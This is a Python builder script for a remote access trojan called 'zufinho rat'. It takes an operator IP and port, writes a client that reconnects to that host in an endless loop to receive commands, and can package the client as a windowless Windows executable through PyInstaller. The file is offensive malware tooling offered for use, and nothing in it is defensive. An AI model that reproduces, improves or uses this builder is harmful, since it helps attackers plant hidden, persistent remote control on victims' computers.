import os
import time

if not os.name=="nt":
    print("working only in windows")
    time.sleep(3)
    exit()
os.system("color 0a")
os.system("title zufinho rat")
name=input("RAT name:")
ip=input("IP (you can use your radmin ip):")
port=int(input("Port:"))
exepy=input("EXE or PY?")

def py(ip,port,name):
    os.system("md temp")
    print("Building py...")
    os.system(r"copy src\client.py temp\client.py")
    os.system(r"copy src\server.py temp\server.py")
    print("copyed temp files...")
    print("creating client...")
    client=open(r"temp\client.py","a")
    clientcontent=f"""
rat = RAT_CLIENT('{ip}', {port})

if __name__ == '__main__':
    while True:
        try:
            rat.build_connection()
            rat.execute()
        except:
            print("trying reconnect")
    """
    client.write(clientcontent)
    print("client created")
    client.close()
    print("creating server...")
    server=open(f"temp\server.py","a")
    servercontent=f"""
rat = RAT_SERVER('{ip}', {port})

if __name__ == '__main__':
    rat.build_connection()
    rat.execute()
    """
    server.write(servercontent)
    server.close()
    print("server created")
    os.system(f"copy temp\client.py {name}.py")
    os.system(f"copy temp\server.py {name}_server.py")
    print("modified name")
    print("clearing temp...")
    os.system("rd /q /s temp")
    print("cleared")
    print("rat complete")

def exe(ip,port,name):
    os.system("md temp")
    print("Building py...")
    os.system(r"copy src\client.py temp\client.py")
    os.system(r"copy src\server.py temp\server.py")
    print("copyed temp files...")
    print("creating client...")
    client=open(r"temp\client.py","a")
    clientcontent=f"""
rat = RAT_CLIENT('{ip}', {port})

if __name__ == '__main__':
    while True:
        try:
            rat.build_connection()
            rat.execute()
        except:
            print("trying reconnect")
    """
    client.write(clientcontent)
    print("client created")
    client.close()
    print("creating server...")
    server=open(f"temp\server.py","a")
    servercontent=f"""
rat = RAT_SERVER('{ip}', {port})

if __name__ == '__main__':
    rat.build_connection()
    rat.execute()
    """
    server.write(servercontent)
    server.close()
    print("server created")
    print("transforming to .exe ...")
    os.system("pyinstaller --onefile --noconsole --i=NONE temp\client.py")
    print("transformed .exe!")
    os.system(f"copy dist\client.exe {name}.exe")
    os.system(f"copy temp\server.py {name}_server.py")
    print("modified name")
    print("clearing temp...")
    os.system("rd /q /s temp")
    os.system("rd /q /s build")
    os.system("rd /q /s dist")
    os.system("del /q client.spec")
    print("cleared")
    print("rat complete")

if exepy=="py" or exepy=="PY" or exepy=="Py" or exepy=="pY":
    py(ip=ip,port=port,name=name)
if exepy=="exe" or exepy=="Exe" or exepy=="eXe" or exepy=="exE" or exepy=="EXe" or exepy=="eXE" or exepy=="EXE":
    exe(ip=ip,port=port,name=name)
os.system("pause")